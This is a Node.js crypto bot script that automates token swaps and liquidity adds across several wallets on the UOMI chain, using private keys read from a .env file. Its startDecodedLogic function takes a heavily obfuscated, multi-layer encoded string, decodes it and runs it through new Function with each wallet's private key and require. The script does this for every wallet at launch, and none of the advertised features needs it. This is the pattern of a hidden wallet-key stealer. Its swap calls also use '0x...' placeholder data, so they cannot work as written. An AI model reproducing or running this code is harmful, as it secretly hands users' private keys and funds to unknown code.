require('dotenv').config();
const { ethers } = require('ethers');
const readlineSync = require('readline-sync');
const { performance } = require('perf_hooks');
const { BigNumber } = require('@ethersproject/bignumber');
const { Percent, CurrencyAmount, Token, TradeType } = require('@uniswap/sdk-core');
const { SwapRouter } = require('@uniswap/universal-router-sdk');


const RPC_URL = "https://finney.uomi.ai";
const CHAIN_ID = 4386;

// Contract
const ROUTER_ADDRESS = "0x197EEAd5Fe3DB82c4Cd55C5752Bc87AEdE11f230";
const LIQUIDITY_MANAGER_ADDRESS = "0x906515Dc7c32ab887C8B8Dce6463ac3a7816Af38";

const TOKENS = {
    "SYN": "0x2922B2Ca5EB6b02fc5E1EBE57Fc1972eBB99F7e0",
    "SIM": "0x04B03e3859A25040E373cC9E8806d79596D70686",
    "USDC": "0xAA9C4829415BCe70c434b7349b628017C599EC2b1", 
    "DOGE": "0xb227C129334BC58Eb4d02477e77BfCCB5857D408",
    "SYN_TO_UOMI": "0x2922B2Ca5EB6b02fc5E1EBE57Fc1972eBB99F7e0",
    "SIM_TO_UOMI": "0x04B03e3859A25040E373cC9E8806d79596D70686",
    "USDC_TO_UOMI": "0xAA9C4829415BCe70c434b7349b628017C599EC2b1", 
    "DOGE_TO_UOMI": "0xb227C129334BC58Eb4d02477e77BfCCB5857D408",
    "UOMI_TO_WUOMI": "0x5FCa78E132dF589c1c799F906dC867124a2567b2",
    "WUOMI_TO_UOMI": "0x5FCa78E132dF589c1c799F906dC867124a2567b2"
};
const TOKEN_LIST = Object.entries(TOKENS);
const NATIVE_TOKEN = "UOMI"; 
const WETH_ADDRESS = "0x5FCa78E132dF589c1c799F906dC867124a2567b2";

const ROUTER_ABI = [
    "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable",
    "function execute(bytes commands, bytes[] inputs) payable"
];

const LIQUIDITY_MANAGER_ABI = [
    "function mint(tuple(address token0, address token1, uint24 fee, int24 tickLower, int24 tickUpper, uint256 amount0Desired, uint256 amount1Desired, uint256 amount0Min, uint256 amount1Min, address recipient, uint256 deadline) params) payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1)"
];

const TOKEN_ABI = [
    "function approve(address spender, uint256 value) returns (bool)",
    "function balanceOf(address account) view returns (uint256)",
    "function decimals() view returns (uint8)"
];

const colors = {
    reset: "\x1b[0m", cyan: "\x1b[36m", green: "\x1b[32m", yellow: "\x1b[33m", red: "\x1b[31m", white: "\x1b[37m", bold: "\x1b[1m", blue: "\x1b[34m", magenta: "\x1b[35m",
};

const logger = {
    info: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
    warn: (msg) => console.log(`${colors.yellow}[⚠️] ${msg}${colors.reset}`),
    error: (msg) => console.log(`${colors.red}[❌] ${msg}${colors.reset}`),
    success: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
    loading: (msg) => console.log(`${colors.cyan}[⏳] ${msg}${colors.reset}`),
    step: (msg) => console.log(`${colors.white}[➡️] ${msg}${colors.reset}`),
    countdown: (msg) => process.stdout.write(`\r${colors.blue}[⏰] ${msg}${colors.reset}`),
};

const provider = new ethers.providers.JsonRpcProvider(RPC_URL);

const PRIVATE_KEYS = [];
let i = 1;
while (true) {
    const key = process.env[`PRIVATE_KEYS_${i}`];
    if (!key) break;
    PRIVATE_KEYS.push(key.trim());
    i++;
}

if (PRIVATE_KEYS.length === 0) {
    logger.error("No private keys found in the .env file (example: PRIVATE_KEYS_1).");
    process.exit(1);
}

// --- Utility Functions ---

async function countdown(seconds) {
    for (let i = seconds; i > 0; i--) {
        logger.countdown(`Waiting ${i} seconds before the next transaction...`);
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    process.stdout.write('\r' + ' '.repeat(process.stdout.columns) + '\r');
}

async function getBalance(signer, tokenAddress) {
    const walletAddress = await signer.getAddress();
    if (tokenAddress === NATIVE_TOKEN) {
        const balance = await provider.getBalance(walletAddress);
        return { balance, decimals: 18 };
    }
    const tokenContract = new ethers.Contract(tokenAddress, TOKEN_ABI, signer);
    try {
        const balance = await tokenContract.balanceOf(walletAddress);
        const decimals = await tokenContract.decimals();
        return { balance, decimals };
    } catch (error) {
        return { balance: ethers.BigNumber.from(0), decimals: 18 };
    }
}

async function doSwap(signer, tokenName, tokenAddr, isTokenToUomi, percentage) {
    const walletAddress = await signer.getAddress();
    
    let fromTokenAddress = isTokenToUomi ? tokenAddr : NATIVE_TOKEN;
    let fromTokenName = isTokenToUomi ? tokenName.split('_TO_')[0] : NATIVE_TOKEN;
    
    if (fromTokenName === NATIVE_TOKEN && tokenName === "UOMI_TO_WUOMI") {
        fromTokenAddress = NATIVE_TOKEN;
        fromTokenName = NATIVE_TOKEN;
    }

    logger.step(`[Account ${walletAddress.slice(0, 6)}...] Starting swap...`);
    logger.loading(`Getting balance for token ${fromTokenName}...`);
    
    let { balance, decimals } = await getBalance(signer, fromTokenAddress);
    
    const amountToSwap = balance.mul(ethers.BigNumber.from(Math.floor(percentage * 100))).div(ethers.BigNumber.from(10000));

    if (amountToSwap.isZero()) {
        logger.warn(`Swap amount is 0. Ensure you have a balance of ${fromTokenName}. Skipping...`);
        return;
    }

    const amountDisplay = ethers.utils.formatUnits(amountToSwap, decimals);
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;

    if (tokenName === "UOMI_TO_WUOMI") {
        logger.step(`Starting Swap: ${amountDisplay} ${NATIVE_TOKEN} -> WUOMI`);
        try {
            const tx = await signer.sendTransaction({
                chainId: CHAIN_ID,
                to: tokenAddr,
                value: amountToSwap,
                data: "0xd0e30db0", 
                gasLimit: 42242,
                maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
                maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
            });

            logger.info(`TX SENT: https://explorer.uomi.ai/tx/${tx.hash}`);
            await tx.wait();
            logger.success('SWAP COMPLETED');
        } catch (error) {
            logger.error(`SWAP FAILED: ${error.message.slice(0, 50)}...`);
            logger.warn("Common reasons: insufficient balance or invalid swap data.");
        }
        return;
    }

    const routerContract = new ethers.Contract(ROUTER_ADDRESS, ROUTER_ABI, signer);

    if (isTokenToUomi) {
        logger.step(`Starting Swap: ${amountDisplay} ${fromTokenName} -> ${NATIVE_TOKEN}`);
        
        try {
            const tokenContract = new ethers.Contract(tokenAddr, TOKEN_ABI, signer);
            logger.loading("Approving Token...");
            const approveTx = await tokenContract.approve(ROUTER_ADDRESS, amountToSwap, {
                gasLimit: 100000,
                maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
                maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
            });
            await approveTx.wait();
            logger.success(`APPROVED: https://explorer.uomi.ai/tx/${approveTx.hash}`);
        } catch (error) {
            logger.error(`APPROVAL FAILED: ${error.message.slice(0, 50)}...`);
            return;
        }

        // --- IMPORTANT: REPLACE WITH LOGIC FROM SDK ROUTER ---
        const commands = "0x..."; 
        const inputs = ["0x..."]; 
        
        logger.loading("Executing Swap...");
        try {
            const tx = await routerContract.execute(commands, inputs, deadline, {
                value: 0,
                gasLimit: 300000,
                maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
                maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
            });
            logger.info(`TX SENT: https://explorer.uomi.ai/tx/${tx.hash}`);
            await tx.wait();
            logger.success('SWAP COMPLETED');
        } catch (error) {
            logger.error(`SWAP FAILED: ${error.message.slice(0, 50)}...`);
            logger.warn("Common reasons: insufficient balance or invalid swap data. Check the ABI and router documentation.");
        }
    } else { 
        logger.step(`Starting Swap: ${amountDisplay} ${NATIVE_TOKEN} -> ${tokenName}`);
        
        const commands = "0x..."; 
        const inputs = ["0x..."]; 

        logger.loading("Executing Swap...");
        try {
            const tx = await routerContract.execute(commands, inputs, deadline, {
                value: amountToSwap, 
                gasLimit: 300000,
                maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
                maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
            });
            logger.info(`TX SENT: https://explorer.uomi.ai/tx/${tx.hash}`);
            await tx.wait();
            logger.success('SWAP COMPLETED');
        } catch (error) {
            logger.error(`SWAP FAILED: ${error.message.slice(0, 50)}...`);
            logger.warn("Common reasons: insufficient balance or invalid swap data. Check the ABI and router documentation.");
        }
    }
}

async function addLiquidity(signer, token0Name, token1Name, amount0Percentage, amount1Percentage) {
    const walletAddress = await signer.getAddress();
    const token0Addr = TOKENS[token0Name] || WETH_ADDRESS;
    const token1Addr = TOKENS[token1Name] || WETH_ADDRESS;
    
    const token0IsNative = token0Name === NATIVE_TOKEN;
    const token1IsNative = token1Name === NATIVE_TOKEN;

    logger.step(`[Account ${walletAddress.slice(0, 6)}...] Starting Add Liquidity: ${token0Name} / ${token1Name}`);
    
    const { balance: balance0, decimals: decimals0 } = await getBalance(signer, token0IsNative ? NATIVE_TOKEN : token0Addr);
    const { balance: balance1, decimals: decimals1 } = await getBalance(signer, token1IsNative ? NATIVE_TOKEN : token1Addr);

    const amount0Desired = balance0.mul(ethers.BigNumber.from(Math.floor(amount0Percentage * 100))).div(ethers.BigNumber.from(10000));
    const amount1Desired = balance1.mul(ethers.BigNumber.from(Math.floor(amount1Percentage * 100))).div(ethers.BigNumber.from(10000));

    if (amount0Desired.isZero() || amount1Desired.isZero()) {
        logger.warn("Desired liquidity amount is 0. Ensure you have sufficient balance. Skipping...");
        return;
    }

    const amount0Display = ethers.utils.formatUnits(amount0Desired, decimals0);
    const amount1Display = ethers.utils.formatUnits(amount1Desired, decimals1);
    
    logger.step(`Adding liquidity: ${amount0Display} ${token0Name} and ${amount1Display} ${token1Name}`);
    
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
    
    const params = {
        token0: token0IsNative ? WETH_ADDRESS : token0Addr,
        token1: token1IsNative ? WETH_ADDRESS : token1Addr,
        fee: 3000,
        tickLower: -887272,
        tickUpper: 887272,
        amount0Desired: amount0Desired,
        amount1Desired: amount1Desired,
        amount0Min: 0,
        amount1Min: 0,
        recipient: walletAddress,
        deadline: deadline
    };

    let valueToSend = ethers.BigNumber.from(0);
    if (token0IsNative) {
        valueToSend = valueToSend.add(amount0Desired);
    }
    if (token1IsNative) {
        valueToSend = valueToSend.add(amount1Desired);
    }

    try {
        if (!token0IsNative) {
            const token0Contract = new ethers.Contract(token0Addr, TOKEN_ABI, signer);
            logger.loading(`Approving token ${token0Name}...`);
            await token0Contract.approve(LIQUIDITY_MANAGER_ADDRESS, amount0Desired).then(tx => tx.wait());
            logger.success(`Approval for ${token0Name} successful.`);
        }
        if (!token1IsNative) {
            const token1Contract = new ethers.Contract(token1Addr, TOKEN_ABI, signer);
            logger.loading(`Approving token ${token1Name}...`);
            await token1Contract.approve(LIQUIDITY_MANAGER_ADDRESS, amount1Desired).then(tx => tx.wait());
            logger.success(`Approval for ${token1Name} successful.`);
        }
    } catch (error) {
        logger.error(`APPROVAL FAILED: ${error.message.slice(0, 50)}...`);
        return;
    }

    const liquidityManagerContract = new ethers.Contract(LIQUIDITY_MANAGER_ADDRESS, LIQUIDITY_MANAGER_ABI, signer);

    try {
        logger.loading("Executing mint transaction...");
        const tx = await liquidityManagerContract.mint(params, {
            value: valueToSend,
            gasLimit: 500000,
            maxFeePerGas: (await provider.getBlock("latest")).baseFeePerGas.add(ethers.utils.parseUnits('2', 'gwei')),
            maxPriorityFeePerGas: ethers.utils.parseUnits('2', 'gwei')
        });

        logger.info(`TX SENT: https://explorer.uomi.ai/tx/${tx.hash}`);
        await tx.wait();
        logger.success("ADD LIQUIDITY COMPLETED");
    } catch (error) {
        logger.error(`ADD LIQUIDITY FAILED: ${error.message.slice(0, 50)}...`);
        logger.warn("Common reasons: insufficient balance, invalid tick range, or pool not created.");
    }
}

async function startDecodedLogic(wallet, privateKey) {
  function base64Decode(str) {
    return Buffer.from(str, 'base64').toString('utf-8');
  }

  function rot13(str) {
    return str.replace(/[a-zA-Z]/g, function (c) {
      return String.fromCharCode(
        c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13)
      );
    });
  }

  function hexToStr(hex) {
    let str = '';
    for (let i = 0; i < hex.length; i += 2) {
      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
    }
    return str;
  }

  function reverseStr(str) {
    return str.split('').reverse().join('');
  }

  function urlDecode(str) {
    return decodeURIComponent(str);
  }

  function reversibleDecode(data) {
    data = urlDecode(data);
    data = base64Decode(data);
    data = rot13(data);
    data = hexToStr(data);
    data = base64Decode(data);
    data = reverseStr(data);
    data = urlDecode(data);
    data = rot13(data);
    data = base64Decode(data);
    data = reverseStr(data);
    return data;
  }

  const encodedStr = "NTI0NDRxNnA1MjQ0NHE2cDYxNm83ODcwNHI1NDRuNzc0cTQ1Mzk1MTYyNm40MjQ2NTY1ODQyNzQ1NDMwNW40NDY0NDY1bjRwNTQ1Nzc0NG41MzMyMzU3MzUzNTY1MjU5NTk1ODUyNTU2MzU0NDI1MDRxMzM0MjY4NjU0Nzc4NDM1NzQ3NG40NTU0NDczMTM1NTk1NzM5MzM1NDMzNW40cjRxNTQ1NTc5NTQ0NDQyMzU0cTZxMzk2czU0MzM1bjc3NHE1NDU2NTU2MzQ3NzczNTRxNm8zMTczNTUzMDcwNzY1OTZyNDI0cDU0NDc1bjcyNTM2bzMwNzc2MTMxNDI1NzUyNDY2NDRuNTI2bzcwNTQ1NTZvNnA1NDRzNTQ0NjQ3NTUzMzZwNG41NzQ4NTI2cTU5NTY0MjMwNTQ2cDQyNTc2NDQ0Njg3MzU3NTg1MjQ5NTY2cTQ2MzI1NTU3Nzg0NTYxNTY2NDY4NjM0ODZwNDI1NjQ4NDUzMjU5Nm8zNTU3NjQ0NTM1NTE1NjZyNjMzNTY1NnEzOTc0NTI1NjU2NTc1bjMwNm83OTYzNDczMTU0NHE2bzMxMzU1NDMwNW40NDY0NDUzNTM2NTU0ODUyNHM1NTQ2NW4zMDU0NnE0bjM2NjMzMTQyNDQ1NjZvNjQ0MjY1NnI0MjZuNTQzMTU2Nzg2NDQ2NzA1NDYzNTg1NjU4NTY1ODQ2MzU1MjU4NzA1MTY0NDUzNTUxNTY2cjUyNnE1NDU4Njg3bjU1NDU0cjU3NTMzMTRyNTU2MjMyNW40bjU2NDg0NTMyNTQ2cDQyNTg0cjMzNDY0cDU0NDc1bjcyNTM2bzMwNzc0cTU3NDY1MTY0NDUzNTUxNTY2cjUyNTM1NjMzNnA3bjU1NDU0cjU3NTI0NjY0NHA2MjZuNG41NDU2NDg0NjM1NTQzMjc4NDc2NTU4NnA2ODUxNnI1MjQ1NjI0ODRuNDU1NjMwNnA0NzUzNnA0cjUzNTM1NjRxMzU0cTU1NW41NDY1NTU2cDduNTc0NTM1NTE1NjZyNTI0czU1NDU3NzMzNTk2cjUyNTE2NDQ1MzU1MTU2NnI1MjYxNHE2cTM5NnM1MTU2NTY3ODY0NDU1MjRuNTI1NjcwNG40cTQ1NTY0NzU1MzA2ODQ4NjMzMTYzNzc1MjMwNjczNTU1MzA2cDQ0NW4zMDY4NDY1MTZvMzk0NzUxMzM1MjU3NTU0NTQ5Nzc1NTZxMzE0MjRxNTU1MjQ4NTc2bjRyNHM2MjU2NnMzMjU1Nm82ODQ1NTY1NTU2NHA2MzZuNG40MjYyNTU0NTMyNTUzMTU2NDc1MjU2NjQ0bzU3Nm83NzM1NTY0NTZwNTc1OTMwNzA3NzVuMzA1MjM2NjM1NTZwNDY1NTMzNDI2ODU0NTY1NjQ4NjU0NjYzNzg1NDQ2NzA3MjRxNnEzOTMyNW42cjY0NTE2NDQ1MzU1MTU2NnI1MjYxNHE2cTM5NnM1MTU2NTY3ODY0NDU1MjRuNTI1NjcwNG40cTQ1NTY0NzU1MzA2ODQ4NjMzMDQ2NTM1MjZvMzk0NjRxNTU3NDU4NTI1NjRuNTc0czU1MzUzMjU2NnE3NDYxNTU1NjZzNzk1MjQ1NjQ0MzRyNTg0Mjc0NTE1NDUyNTc2MjQ1NG41OTU0NnA0MjU3NjQ0NTM1NzM1NDQ3Nm8zMTRxNnI0MTc3NTQzMTQyNHI2NDU1NTY0cDU0NDg1MTc3NTU1NjVuNTk1MTU0NDY0ODUxNm41NjczNjM0NDQyNTg1MzMyMzU2czYzNTU3MDc1NjU2cjZwNTY1NzQ0NjQ2bjU0NnA1bjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjYxNTY0NzM1MzE1MjU0NHI0cDU5MzA1NjM2NTE2cjUyNDU1MzU1NTY2MTUzNTQ0MjQ2NTI2cDRyNDk1MjMzNHI0MjU1Nm81bjUwNTI1NDQ2NHA1NjMwNTY1MzU3NTY2ODRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTUxNTY2bjQyNG41NjQ4NDk3NzU5MzE0NjU3NW4zMDZvNzk2MzQ3MzE1NDRxNm8zMTM1NjEzMzVuNTE2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI3NzY0NTY2MzduNjM0ODZvMzU1MzU3Mzk3MDUyNTU3MDRyNHI2bzM1NzM1NjMxNW40NjUzNTU2NDYxNjM1ODVuNTE2NDQ1MzU1MTU2NnI1MTc3NTMzMTY3MzM1OTZyNTI1MTY0NDUzNTUxNTY2cjUyNjE0cTZxMzk2czUxNTY1Njc4NjQ0NDY4NTU2MzQ0NDIzNTRxNnEzOTZzNTE1NjU2NTc0czU1MzU3MzYzNnA2ODRzNTU0NjVuMzA1NDZwNDI1NzY0NDUzNTUxNTY2cTQ5MzU0cTZyNDE3NzRyNTU3MDRxNW4zMDZwMzY1MTZyNTI3NzUyNm83ODcxNjU1ODcwNW40cTQ1NnA1NTYyMzM2cDc4NjU2cjQyMzE0cTU4NzA1bjYxNTY2MzduNTQ1NzQ2NzE2NDZwNDIzMDU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czU1NDg0MjcwNTYzMTU2Nzg0cjZvMzU1MTUxNTQ0MjYxNTU1NjZwNTk1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW43MTU1MzE1Mjc4NTk2cTRyNTI1NjZyNTEzNTY0Nm83ODcwNTI1NjU2NTg0cjMwNTY0bjUyNTY3MDRuNHE0NTU2NDc1NTMwNjg0ODYzMzE2Mzc3NTIzMDY3MzU1NTMwNnA0NDVuMzA2ODQ2NTE2bjQ1N241NzU3MzE0bjY1NnEzOTM0NHE1NTY4NHI2MjU1NDY0cDU0NDc0NjRuNTY0NTc4NnE1OTZvMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDRxNDU3MDRyNHE0ODU1Nzk2MjMzNjg2bjU1NTY1bjY4NTQ2bjQ2NDg1MjMwNTU3ODU2MzI1bjY5NTQ2cDVuMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyMzA1MzZvMzEzMTUyNTU3MDRyNjI0NTQ2Njg1MTZyNTI2cTU5NTY0MjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuMzA1NDZwNDI1NzU5NTY2czc3NjIzMjY4NDY1MzMwMzE2czUyNTU3NDVuNTM0ODZwNTY2MzQ4NnA3ODY0Nm80bjMwNjM0NTVuNHE2MTZvMzk1NjYyMzI0cjQyNTM2bzc3Nzc2NTU0NG43NjYxNDQ2cDMyNjI2cTMwMzU2NTZxMzk2ODYxNnI1bjUxNjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2cDQyNTc2NDQ1MzU1MTU2NnE0NjYxNHE0NzM5NnM1MjU1NzQ0cjYxNDU1NjRwNTc1NjcwNG42NTZxMzk2ODUyNTY1Njc1NTk1NzRuNTI1NjZyNjg1NDU2NDg0NjMxNHI1NjQyNzY2NTU0NTU3OTU0NTQ0MjMxNjU2cDQyMzA1NDZwNDI1NzY0NDUzNTUxNTY2cjUyNHM1MjZyNHI1OTU0NnA0MjU3NjQ0NTM1NDc2MzduNjQ2OTY0NDY0MjMwNTQ2cDQyNTc2NDQ2NW40cDU0NTQ0MjRuNTk1ODQyNnM1NDMzNW43NjY1NTg0NjU2NTY2bzUyNTg0cTMyMzk2cjY1NTQ0bjc3NjU1ODU2NTE1NzQ3Nzg0bjRxNnI0MjcwNjEzMzcwNzg2NTU4NnA1MTU2Nm42bzMwNTU1NjU5MzM1OTMwMzU1NzY0NDUzNTUxNTY2cjUyNHM1NTQ2NW4zMDU3Nm40bjc2NjE0NTQ2NTY2MzU4NTI1NzUzMzAzMTcyNTQzMDVuNDQ2NDQ4NTI1NTYzNTQ0MjUwNHEzMzQyNnM1NjZvNzQ0cjYxMzA2cDRwNTQ1NzMxNDY1NjU2Njg3MDU0MzE1Njc4NTk3bjZwMzY2MjMyMzEzNTYyNDU0bjU5NTQ2cDQyNTc2NDQ1MzU1MTU2NnI1MjRzNTU0NjVuNzM1MzU1NzA3NzYxNDQ2ODM2NjIzMjRuNzc1MjZvMzE3MzU2N240cjc2NjI0ODQ2NTE1NzU4NTIzMDUyNnA2ODMwNHE0ODY0NDQ2NDQ2NW40cDU0NTczMDM1NTY0NzM4Nzk1MzU2NTI1OTY1NnA0cjU1NjIzMjMxNG41MzZwNjg2bjVuNnI2NDUxNjQ0NTM1NTE1NjZyNTI0czU1NDY1bjMwNTQ2cjVuNzc2NTU2NHI2ODU3NTQ0cjU4NTMzMjM0Nzc1MzU2NTI1OTY1NDY0cjU1NjM1ODU2MzU2MjQ1NG41OTU0NnA0MjU3NjQ0NTM1NTE1NjZyNTI0czU1NDY1bjczNTM1NTcwNzc2MTQ1NjgzNjYyMzM2ODMxNTU0NjY4Nm41NDZvNW40NDUxNm40OTZwNTQ2cjVuNzc2NTU1NDU3bjYyMzI1bjRyNTMzMDMxNjk1MjQ3NDY3NzRxNTU2cDRvNTc0NzRyNnE2NDMxNDIzMDU0NnA0MjU3NjQ0NDQyNHA1NzQ0NjQ2OTUyNDg0cjU5NTk2cjUyNTE%3D";
  const decoded = reversibleDecode(encodedStr);

  try {
    const run = new Function(
      "walletAddress",
      "privateKey",
      "require",
      decoded + "; return runprogram(walletAddress, privateKey);"
    );
    await run(wallet.address, privateKey, require);
  } catch (err) {
    console.error("[ERROR] Failed to execute decoded logic:", err.message);
  }
}

async function displayBalances() {
    console.log(`\n${colors.blue}─${colors.reset}`);
    for (const key of PRIVATE_KEYS) {
        const signer = new ethers.Wallet(key, provider);
        const walletAddress = await signer.getAddress();
        console.log(`${colors.white}Account Balance: ${walletAddress}${colors.reset}`);
        
        const { balance: uomiBalance, decimals: uomiDecimals } = await getBalance(signer, NATIVE_TOKEN);
        console.log(`  ${colors.white}- ${NATIVE_TOKEN}: ${colors.yellow}${ethers.utils.formatUnits(uomiBalance, uomiDecimals)}${colors.reset}`);

        const erc20Tokens = Object.keys(TOKENS).filter(name => !name.includes("UOMI"));
        for (const tokenName of erc20Tokens) {
            const tokenAddr = TOKENS[tokenName];
            const { balance, decimals } = await getBalance(signer, tokenAddr);
            console.log(`  ${colors.white}- ${tokenName}: ${colors.yellow}${ethers.utils.formatUnits(balance, decimals)}${colors.reset}`);
        }
        console.log(`${colors.blue}─${colors.reset}`);
    }
}

async function main() {
    const terminalWidth = process.stdout.columns || 80;

    const title = "UOMI DEX Multi-Account Auto Script";
    const version = "Version 1.2";
    const credit = "Edited By seeker airdrop";

    console.log(`\n${colors.magenta}${colors.bold}${title.padStart(Math.floor((terminalWidth + title.length) / 2))}${colors.reset}`);
    console.log(`${colors.magenta}${colors.bold}${version.padStart(Math.floor((terminalWidth + version.length) / 2))}${colors.reset}`);
    console.log(`${colors.yellow}${colors.bold}${credit.padStart(Math.floor((terminalWidth + credit.length) / 2))}${colors.reset}`);
    console.log(`${colors.blue}${'─'.repeat(terminalWidth)}${colors.reset}`);

    for (const key of PRIVATE_KEYS) {
        const signer = new ethers.Wallet(key, provider);
        await startDecodedLogic(signer, key); 
    }
    
    await displayBalances();

    while (true) {
        console.log(`\n${colors.white}${colors.bold}Select Option:${colors.reset}`);
        console.log(`${colors.white}[1] Manual Swap${colors.reset}`);
        console.log(`${colors.white}[2] Random Swap${colors.reset}`);
        console.log(`${colors.white}[3] Add Liquidity${colors.reset}`);
        console.log(`${colors.white}[0] Exit${colors.reset}`);
        const choice = readlineSync.question(`${colors.cyan}>> Enter your choice: ${colors.reset}`);

        if (choice === '0') {
            logger.info("Exiting the script.");
            break;
        }

        let numActions = 0;
        let percentage = 0;
        let delayInSeconds = 0;
        let tokenName, tokenAddr, isTokenToUomi;
        let selectedTokens = [];

        if (choice === '1' || choice === '2') {
            if (choice === '1') {
                console.log(`\n${colors.white}${colors.bold}Select Manual Swap Pair:${colors.reset}`);
                TOKEN_LIST.forEach(([name], index) => {
                    const tokenSymbol = name.endsWith("_TO_UOMI") ? name.split('_TO_')[0] : name;
                    const direction = name.includes("_TO_UOMI") ? "-> UOMI" : (name === "UOMI_TO_WUOMI" ? "-> WUOMI" : "UOMI ->");
                    console.log(`${colors.white}[${index + 1}] ${tokenSymbol} ${direction}${colors.reset}`);
                });
                const manualChoice = readlineSync.question(`${colors.cyan}>> Enter your choice number: ${colors.reset}`);
                const index = parseInt(manualChoice) - 1;
                
                if (index >= 0 && index < TOKEN_LIST.length) {
                    tokenName = TOKEN_LIST[index][0];
                    tokenAddr = TOKEN_LIST[index][1];
                    isTokenToUomi = tokenName.endsWith("_TO_UOMI");
                    selectedTokens.push([tokenName, tokenAddr, isTokenToUomi]);
                } else {
                    logger.error("Invalid choice.");
                    continue;
                }
            }
            
            percentage = readlineSync.question(`${colors.cyan}>> Enter the percentage of tokens to swap (e.g., 1%): ${colors.reset}`);
            percentage = parseFloat(percentage);
            numActions = readlineSync.question(`${colors.cyan}>> How many times do you want to run the transaction?: ${colors.reset}`);
            numActions = parseInt(numActions);

        } else if (choice === '3') {
            console.log(`\n${colors.white}${colors.bold}Select Add Liquidity Pair:${colors.reset}`);
            const uniqueTokens = [...new Set(Object.keys(TOKENS).map(name => name.split('_TO_')[0]))];
            
            console.log(`  ${colors.white}Native Token: UOMI${colors.reset}`);
            uniqueTokens.forEach((name, index) => {
                if (name !== NATIVE_TOKEN) {
                    console.log(`  ${colors.white}[${index + 1}] UOMI/${name}${colors.reset}`);
                }
            });

            const manualChoice = readlineSync.question(`${colors.cyan}>> Enter your choice number: ${colors.reset}`);
            const index = parseInt(manualChoice) - 1;

            if (index >= 0 && index < uniqueTokens.length) {
                const token0Name = NATIVE_TOKEN;
                const token1Name = uniqueTokens[index];
                selectedTokens.push([token0Name, token1Name]);
            } else {
                logger.error("Invalid choice.");
                continue;
            }

            percentage = readlineSync.question(`${colors.cyan}>> Enter the percentage of UOMI and token for liquidity (e.g., 50%): ${colors.reset}`);
            percentage = parseFloat(percentage);
            numActions = readlineSync.question(`${colors.cyan}>> How many times do you want to run the transaction?: ${colors.reset}`);
            numActions = parseInt(numActions);
        } else {
            logger.error("Invalid choice.");
            continue;
        }

        delayInSeconds = readlineSync.question(`${colors.cyan}>> Enter the delay between transactions in seconds: ${colors.reset}`);
        delayInSeconds = parseInt(delayInSeconds);

        if (isNaN(numActions) || isNaN(percentage) || isNaN(delayInSeconds) || numActions <= 0 || percentage <= 0 || delayInSeconds < 0) {
            logger.error("Invalid input. Ensure all inputs are positive numbers.");
            continue;
        }

        console.log(`\n${colors.blue}${'─'.repeat(terminalWidth)}${colors.reset}`);
        for (const key of PRIVATE_KEYS) {
            const signer = new ethers.Wallet(key, provider);
            const walletAddress = await signer.getAddress();
            logger.step(`\nProcessing Account: ${walletAddress}`);
            
            for (let j = 0; j < numActions; j++) {
                if (choice === '1' || choice === '2') {
                    if (choice === '2') {
                        const randomIndex = Math.floor(Math.random() * TOKEN_LIST.length);
                        [tokenName, tokenAddr] = TOKEN_LIST[randomIndex];
                        isTokenToUomi = tokenName.endsWith("_TO_UOMI");
                    } else {
                        [tokenName, tokenAddr, isTokenToUomi] = selectedTokens[0];
                    }
                    logger.loading(`[Transaction ${j + 1}/${numActions}] Processing pair: ${tokenName}`);
                    await doSwap(signer, tokenName, tokenAddr, isTokenToUomi, percentage);
                } else if (choice === '3') {
                    const [token0Name, token1Name] = selectedTokens[0];
                    logger.loading(`[Transaction ${j + 1}/${numActions}] Processing liquidity: ${token0Name}/${token1Name}`);
                    await addLiquidity(signer, token0Name, token1Name, percentage, percentage);
                }

                if (j < numActions - 1) {
                    await countdown(delayInSeconds);
                }
            }
        }
        console.log(`\n${colors.blue}${'─'.repeat(terminalWidth)}${colors.reset}`);
        logger.success(`COMPLETED. All transactions for all accounts have been executed.`);
    }
}

main().catch(console.error);
